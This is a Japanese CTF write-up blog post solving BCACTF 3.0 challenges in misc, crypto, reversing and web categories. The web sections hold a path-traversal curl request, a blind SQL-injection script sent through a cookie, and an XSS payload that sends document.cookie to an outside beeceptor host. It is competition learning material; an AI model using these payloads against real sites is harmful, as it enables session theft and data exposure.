---
title: "BCACTF 3.0 Writeup"
date: 2022-06-07T15:00:00+09:00
lastmod: 2022-06-07T15:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fbcactf_2022%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://play.bcactf.com/challenges](https://play.bcactf.com/challenges)
<br /><br />

[BCACTF 1.0](https://captureamerica.github.io/writeups/post/bcactf_2019/)、[BCACTF 2.0](https://captureamerica.github.io/writeups/post/bcactf_2021/) と毎回参加してきたので、ちょっと忙しかったんですが、今回の3.0も参加させてもらいました

3575点を獲得し、最終順位は54位でした。<br />

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_score.png" alt="bcactf_2022_score.png">

<br><br>

以下はチャレンジのリストです。<br />

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_solves1.png" alt="bcactf_2022_solves1.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_solves2.png" alt="bcactf_2022_solves2.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_solves3.png" alt="bcactf_2022_solves3.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_solves4.png" alt="bcactf_2022_solves4.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_solves5.png" alt="bcactf_2022_solves5.png">

<br />

このCTFサイト、ちょっとリソースを食うみたいで、時々パソコンが結構重く感じました。。。



<br /><br />
<br /><br />
## [Misc]: Blender Creation (150 points)
- - -
### Challenge
> I'm learning how to use Blender, and if I'm being honest I have no idea what I'm doing. Here's a render of something I made, not exactly sure what it is though.
<br /><br />
Hint1: Open the image in a text editor
<br />
Hint2: Research the library used

Attachment:

- chall.png

<br>

### Solution
バイナリエディタでファイル開くと末尾にPythonコードが付いていることがわかります。ddコマンドで取り出します。

<pre>
$ dd if=chall.png of=out.py bs=1 skip=0x00125808
1959+0 records in
1959+0 records out
1959 bytes transferred in 0.144385 secs (13568 bytes/sec)
</pre>

<br />

実行してみると、'bpy'というモジュールが無いというエラーが出ます。
<pre>
$ python3 out.py

Traceback (most recent call last):
  File "/xxxx/out.py", line 1, in <module>
    import bpy
ModuleNotFoundError: No module named 'bpy'
</pre>

<br />

ググって調べてみると、Blenderの中じゃないと 'bpy' モジュールは使えない、という情報を見つけました。

確かに、チャレンジのタイトルが Blender でしたね。

<br />

Blender というのは使ったことなかったのですが、3Dモデリング ツールということなので、フラグが3Dで得られると予想。

ということで、まず Blender をインストールし、その後、さきほど得られたPythonコードを読み込んで実行すると、フラグが得られました。

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_blender.png" alt="bcactf_2022_blender.png">

<br />

Flag: `bcactf{b13NdR__pXYtH0N_4ND_f0r3N}`




<br /><br />
<br /><br />
## [Misc]: Gogle Maze (175 points)
- - -
### Challenge
> Make it to the end of my [endless maze](https://forms.gle/E6WfJUuf7DLpvySo8) to get the flag!
<br /><br />
Hint1: How does Google know where you are and where you've been?

<br>

### Solution
Google Formを使った Maze ということらしいです。

想定解じゃないと思うんですが、Burp Suiteでレスポンスを見てたら、フラグが出てきていました。

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_googlemaze.png" alt="bcactf_2022_googlemaze.png">

<br />

なお、Google Formでは、Google Accountを使わなくてもフラグは得られました。

<br />

Flag: `bcactf{f4rthER_th4n_m3eTS_th3_EY3_9928ef}`



<br /><br />
<br /><br />
## [Crypto]: New Keyboard (50 points)
- - -
### Challenge
> I bought a new keyboard, but it looks like it's typing gibberish!
<br /><br />
Hint1: My keyboard's not broken
<br />
Hint2: I just need to get used to it.
<br />
Hint3: It uses a different layout from most keyboards.
<br />
Hint4: Don't use dCode. dCode is broken.

Attachment:

- chall.txt

中身：
<pre>
Cy ygpbo rgy ydco t.fxrape go.o yd. Ekrpat nafrgy! Cy p.annf m.oo.o gl mf mgojn. m.mrpfv Yd. unai co xjajyu?t3fx0ape{naf0g7{jdabi3gl{',.pyf+
</pre>


<br>

### Solution
結構多くの人が解いているのに、自分はなかなか解けなくて後回しにしていたやつです。

最初は Hint2 までしかなかったんですが、途中で Hint3 と Hint4 が追加されました。

確かに、[dCode](https://www.dcode.fr/keyboard-shift-cipher) では、うまくフラグが得られなかったんですよね。

<br />

以下のサイトにお世話になりました。

[https://www.geocachingtoolbox.com/index.php?lang=en&page=dvorakKeyboard](https://www.geocachingtoolbox.com/index.php?lang=en&page=dvorakKeyboard)

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_keyboard.png" alt="bcactf_2022_keyboard.png">


<br />

Flag: `bcactf{k3yb0ard_lay0u7_chang3up_qwerty}`



<br /><br />
<br /><br />
## [Crypto]: Hidden Frequencies (100 points)
- - -
### Challenge
> I downloaded one of my friend's files and he got really defensive... it looks like gibberish but I think there might be more to it.
<br /><br />
Hint1: Do all characters appear the same number of times?

Attachment:

- msg.txt

中身：
<pre>
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggghhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiijjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkllllllllllllllllllllllllllllllllllllllllllllllllllllmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnoooooooooooooooooooooooooooooooooooooooooooooooooooppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrsssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssstttttttttttttttttttttttttttttttttttttttttttttttttttuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000111111111111111111111111111111111111111111111111122222222222222222222222222222222222222222222222222222333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444444444444444455555555555555555555555555555555555555555555555566666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777888888888888888888888888888888888888888888888888999999999999999999999999999999999999999999999999............................................................................................................???????????????????????????????????????????????????????????????????????????????????????????????!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#####################################################################################################$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
</pre>


<br>

### Solution
まぁ、タイトルとヒントのそのままです。それぞれの文字の出現回数を調べて、その数字を文字に変換するだけです。

```Python
#!/usr/bin/env python
import string, sys

chars = list(string.ascii_lowercase + string.digits + '.?!<>@#$%^&')
msg = open("msg.txt",'r').read()

for c in chars:
    n = msg.count(c)
    sys.stdout.write(chr(n))
print("")
```

<br />

Flag: `bcactf{ch4r4ct3r_fr3qu3ncy_15_50_c00l_55aFejnb}`



<br /><br />
<br /><br />
## [Rev]: Glassed Over (75 points)
- - -
### Challenge
> I created a new way to hide images, see if you can reverse it and find the flag.
<br /><br />
Hint1: Carefully read through the javascript file to see if you can figure out what's happening.
<br />
Hint2: The result may not be perfect, but it should be mostly legible

Attachment:

- modifiedflag.png
- index.js

中身：

```Javascript
const jimp = require('jimp');

async function main() {
    const image = await jimp.read('flag.png');
    const width = image.bitmap.width;
    const height = image.bitmap.height;
    
    image.scan(0, 0, width, height, (x, y, idx)=>{
        // var red = image.bitmap.data[idx];
        // var green = image.bitmap.data[idx + 1];
        // var blue = image.bitmap.data[idx + 2];
        // var alpha = image.bitmap.data[idx + 3];
        
        image.bitmap.data[idx+3] = Math.random() * 12;
        image.bitmap.data[idx+2] -= 129;
        image.bitmap.data[idx+1] -= 68;

        if (x == image.bitmap.width - 1 && y == image.bitmap.height - 1) {
            image.write("modifiedflag.png");
        }
    });

}
main();
```

<br>

### Solution

コードを見てみると、アルファチャンネルにランダム値を入れていて、green と blue のところは固定値で差分ととっていて、redはそのままになっています。

逆の処理をしたら、green と blue は元に戻りますね。

<br />

ただ、実際のところは green と blue を元に戻さなくても、アルファチャンネルを無効にしてしまえばフラグは見えます。

以下は、modifiedflag.png に対して「青い空を見上げればいつもそこに白い猫」を使ってアルファチャンネルを無効にしたところです。

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_glassedover.png" alt="bcactf_2022_glassedover.png">

<br />

Flag: `bcactf{b!gG3r_!mg_29354758}`



<br /><br />
<br /><br />
## [Rev]: My Very Flag Checker (150 points)
- - -
### Challenge
> Welcome to "My Very Flag Checker", run my program with the flag and it'll tell you if it's correct!
<br /><br />
Hint1: How do you disassemble this binary?

Attachment:

- whatisflag (ELF 64bit)

<br>

### Solution

Ghidraでコードを確認します。

{{< highlight c "linenos=table,hl_lines=16" >}}
undefined8 main(int param_1,undefined8 *param_2)

{
  char *__s;
  undefined8 uVar1;
  size_t sVar2;
  long lVar3;
  
  if (param_1 == 2) {
    __s = (char *)param_2[1];
    puts("Welcome to my flag checker :)");
    sVar2 = strlen(__s);
    if (sVar2 == 0x1f) {
      lVar3 = 0;
      do {
        if ((char)(raw2[lVar3] ^ __s[lVar3]) != raw1[lVar3]) {
          puts("Incorrect flag");
          return 1;
        }
        lVar3 = lVar3 + 1;
      } while (lVar3 != 0x1f);
      puts("Correct! That is the correct flag");
      uVar1 = 0;
    }
    else {
      puts("Incorrect flag.");
      uVar1 = 1;
    }
  }
  else {
    printf("Usage for flag checker: %s <flag>\n",*param_2);
    puts("Exitting");
    uVar1 = 1;
  }
  return uVar1;
}
{{< / highlight >}}

<br />

ハイライトした16行目のところで、フラグのチェックをしています。

raw2 とユーザ入力値（フラグ）をXORして raw1 と一致するか判定をしているので、raw2 と raw1 を XORしてやれば、フラグが得られます。

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_raw2.png" alt="bcactf_2022_raw2.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_raw1.png" alt="bcactf_2022_raw1.png">

<br />

以下のコードで解きました。

```Python
#!/usr/bin/env python
import sys

raw2 = [0xfb, 0xc2, 0xc3, 0x8d, 0x84, 0x08, 0xe5, 0xa6, 0xe8, 0xb4, 0x1c, 0xce, 0x34, 0x14, 0x4f, 0x38, 0x45, 0x74, 0xe0, 0xd5, 0xff, 0x6e, 0xf1, 0xee, 0x53, 0x84, 0x40, 0x4b, 0xba, 0x68, 0x96]

raw1 = [0x99, 0xa1, 0xa2, 0xee, 0xf0, 0x6e, 0x9e, 0xc0, 0x84, 0x80, 0x5b, 0x91, 0x61, 0x7a, 0x2b, 0x0b, 0x37, 0x38, 0xd0, 0xe5, 0x94, 0x0b, 0xb5, 0xb1, 0x36, 0xb3, 0x24, 0x2d, 0x83, 0x0b, 0xeb]

for r2, r1 in zip(raw2, raw1):
    sys.stdout.write(chr(r2 ^ r1))
print("")
```

<br />

Flag: `bcactf{fl4G_Und3rL00keD_e7df9c}`



<br /><br />
<br /><br />
## [Web]: BCACTF 3.0: Story Mode (150 points)
- - -
### Challenge
> bestselling novel
<br /><br />
[http://web.bcactf.com:49218/](http://web.bcactf.com:49218/)
<br /><br />
Hint1: How does this advanced paging technology work, anyway?

Attachment:

- chall.yaml
- project.clj
- core.clj

<br>

### Solution

アクセスすると、novelが表示されます。ページは 0 ~ 6 に分かれていて、7にアクセスしようとすると、404が返ってきます。

どうやら、それぞれのページにファイルが用意されていて、該当するファイルが読み込まれて表示されているようです。

LFI（Local File Inclusion）ですね。

<br />

以下でフラグが取れます。

<pre>
$ curl 'http://web.bcactf.com:49218/story?part=../flag.txt'
bcactf{the_envd_jZNCCrTgxR237loZY12JlA}
</pre>

<br />

Flag: `bcactf{the_envd_jZNCCrTgxR237loZY12JlA}`



<br /><br />
<br /><br />
## [Web]: Blatant SQLi (175 points)
- - -
### Challenge
> blah blah blah something something yusuf are you happy now
<br /><br />
[http://web.bcactf.com:49213/](http://web.bcactf.com:49213/)
<br /><br />
Addendum: The flag is all lowercase.
<br /><br />
Hint1: What kind of feedback does the server give?

Attachment:

- routes.swift

中身：

{{< highlight Python "linenos=table,hl_lines=17 20" >}}
import Vapor
import SQLite
import Foundation

let flag = try! String(contentsOfFile: "flag.txt")

let db: Connection = {
    let db = try! Connection(":memory:")
    try! db.run("CREATE TABLE flags (flag TEXT)")
    try! db.run("INSERT INTO flags VALUES ('\(flag)')")
    return db
}()

func routes(_ app: Application) throws {
    app.get { req -> EventLoopFuture<Vapor.View> in
        var result: String?
        let content = req.cookies.all["flag"]?.string ?? ""
        
        do {
            for _ in try db.prepare("SELECT * FROM flags WHERE flag='\(content)'") {
                result = "yes"
            }
        } catch {
            result = "bad"
        }
        
        return req.view.render("index", ["result": result ?? "no"])
    }

    // Okay while this doesn't do anything it's just easier
    // to keep it in here
    app.get("hello") { req -> String in
        return "Hello, world!"
    }
}
{{< / highlight >}}


<br>

### Solution

Cookie に、SQL Injection の文字列を入れてフラグを取るチャレンジです。LIKE句を使って一文字ずつチェックしていきます。

あっていれば yes、そうでなければ no が返るので、スクリプトを使って繰り返し実行することでフラグが得られます。

```Python
#!/usr/bin/env python

import requests, string

# chars = list(string.ascii_lowercase + string.digits + string.punctuation)
chars = list(string.ascii_lowercase + string.digits + '!#$&?@{}_')

flag = 'bcactf{'
url = 'http://web.bcactf.com:49213/'

while True:
    for c in chars:
        if c == '%' or c == ',' or c == ';':
            continue
        temp_flag = flag + c
        cookies = {"flag":"' union select * from flags where flag like '" + temp_flag + "%' --;"}
        response  = requests.get(url, cookies=cookies)
        if 'yes' in response.text:
            flag = temp_flag
            print(flag)
            if c == '}':
                exit()
            break;
        else:
            # print(temp_flag)
            pass
```

<br />

Flag: `bcactf{you_didnt_see_that_coming_q7ujtvr8q6zt}`




<br /><br />
<br /><br />
## [Web]: Query Service (175 points)
- - -
### Challenge
> I've made a little website to access a SQL database. I even added a way to share your queries with other people! Just copy the link.
<br /><br />
[http://webp.bcactf.com:49156/](http://webp.bcactf.com:49156/)
<br /><br />
Hint1: The contents of the database will give you some info on what to do next.
<br />
Hint2: You can only change the query; can you inject arbitrary HTML with it?

<br>

### Solution

まず、以下を試したのですが、information_schema.tables は無いというエラーが出ました。mysqlではないようです。

<pre>
select * from information_schema.tables
ERROR: no such table: information_schema.tables
</pre>

<br />

いろいろ試したところ、sqliteでした。

<pre>
select * from SQLITE_MASTER
type	name	tbl_name	rootpage	sql
table	notes	notes	2	CREATE TABLE notes (note text)
</pre>

<br />

botにURLを渡せる別のページの情報が得られます。

<pre>
select * from notes
submit link to admin bot at http://webp.bcactf.com:49155/
the flag is in the bot's "flag" cookie
</pre>

<br />

ここで、単純に admin bot に beecaptorのURLを渡しただけだと、Cookieは付いて来ません。

<br />

元のページにはXSSの脆弱性もあり、ここになんとかリンクを埋め込んで、そのリンクを admin bot に踏ませる必要があります。

<br />

偶然の産物なんですが、Queryの末尾にダブルクォーテーションを余分に付けちゃったことがあって、その際のエラー文でXSSが成功しました。

<pre>
select * from SQLITE_MASTER where note="&lt;h2>aaa&lt;/h2>""
</pre>

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_xss.png" alt="bcactf_2022_xss.png">

<br />

ここでは `script` などの文字列フィルター実装されていて、いろいろ試行錯誤した結果、以下でフィルター回避ができました。

<pre>
select * from notes where note="&lt;IMG SRC=/ onerror=this.src='https://captureamerica.free.beeceptor.com/?output='+document.cookie>""
</pre>

<br />

このページのリンクを Admin bot に渡してアクセスさせると、beeceptor側にもCookie情報付きでアクセスが飛びます。

ただ、繰り返し大量のアクセスが発生しちゃうみたいです（1秒以内に55回もリクエストが飛びました）。もうちょっといい想定解があるのかも。

<img src="https://captureamerica.github.io/writeups/img/bcactf_2022_beeceptor.png" alt="bcactf_2022_beeceptor.png">

<br />

Flag: `bcactf{SUBM1TT3D_QUE5TI0NABL3_L1NK}`


<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />